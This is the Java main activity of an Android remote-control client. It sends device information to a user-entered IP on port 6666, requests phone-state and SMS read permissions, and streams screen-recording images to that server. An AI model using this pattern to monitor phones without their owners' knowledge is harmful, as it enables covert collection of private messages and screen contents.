package contol.android.kamike.com.contolclient;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.text.TextUtils;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.blankj.utilcode.util.ActivityUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.ScreenUtils;
import com.blankj.utilcode.util.ToastUtils;

import org.greenrobot.eventbus.EventBus;

import java.io.ByteArrayOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

import contol.android.kamike.com.contolclient.utils.AllUtils;
import contol.android.kamike.com.contolclient.utils.PermissionUtil;

public class MainActivity extends AppCompatActivity {
    private EditText etIp;
    public static final int SERVER_PORT = 6666;
    private TextView tvContent;
    public static final String CHAR_SET = "utf-8";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScreenUtils.setFullScreen(this);
        setContentView(R.layout.activity_main);
        etIp = (EditText) findViewById(R.id.main_ip_et);
        tvContent = (TextView) findViewById(R.id.main_content_tv);
        PermissionUtil.checkPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE, 0);
        EventBus.getDefault().register(this);
    }

    private int failTimes;

    OutputStream socketOutput;
    Socket socketclient;

    public void sendClientInfo(final String info) {
        new Thread() {
            @Override
            public void run() {

                try {
                    if (socketclient == null) {
                        socketclient = new Socket(SERVER_ADDRESS, SERVER_PORT);
                    }
                    socketOutput = socketclient.getOutputStream();
                    socketOutput.write(AllUtils.generateFixLength(info).getBytes());
                    LogUtils.json(info);
                    socketOutput.write(info.getBytes(CHAR_SET));
                    socketOutput.flush();

                } catch (IOException e) {
                    if (!(e instanceof EOFException)) {
                        e.printStackTrace();
                    }
                    System.out.println("IOException=======" + e.getMessage());
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            ToastUtils.showLong("控制端链接失败");
                        }
                    });

                }
            }
        }.start();

    }

    private String SERVER_ADDRESS;


    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public void onclickConnectImg(View view) {
        SERVER_ADDRESS = etIp.getText().toString();
        if (TextUtils.isEmpty(SERVER_ADDRESS)) {
            Toast.makeText(this, "ip地址不能为空", Toast.LENGTH_SHORT).show();
            return;
        }

        failTimes = 0;
        String info = AllUtils.getClientInfo(MainActivity.this, true, null);
        ToastUtils.showLong("读取完成");
        sendClientInfo(info);


    }


    /**
     * 是否正在录像
     */
    private boolean isScreening = false;


    private void closedSocket(Socket socket) {
        if (socket != null) {
            try {
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
        isScreening = false;
        EventBus.getDefault().unregister(this);

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (grantResults.length < 1) {
            Toast.makeText(this, "授权失败", Toast.LENGTH_SHORT).show();
            return;
        }
        if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            permissionSuccess(requestCode);
        } else {
            Toast.makeText(this, "授权失败", Toast.LENGTH_SHORT).show();
        }

    }

    private void permissionSuccess(int requestCode) {
        switch (requestCode) {
            case 0:
                PermissionUtil.checkPermission(this, Manifest.permission.READ_PHONE_STATE, 1);
                break;
            case 1:
                PermissionUtil.checkPermission(this, Manifest.permission.READ_SMS, 2);
                break;
            case 2:
                break;
            case 3:
                break;
            default:

        }


    }


    public void onclickRecord(View view) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            ToastUtils.showLong("系统版本太低");
            return;
        }
        if (!isScreening) {
            ActivityUtils.startActivity(RecordActivity.class);
            isScreening = true;
        }
    }

    public void onImageResoult(ByteArrayOutputStream imgOutStream) {
        if (imgOutStream == null) {
            return;
        }
        try {
            socketOutput.write(AllUtils.getUUIDCache().getBytes(CHAR_SET));
            socketOutput.write("img".getBytes());
            socketOutput.write(imgOutStream.toByteArray());
            socketOutput.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
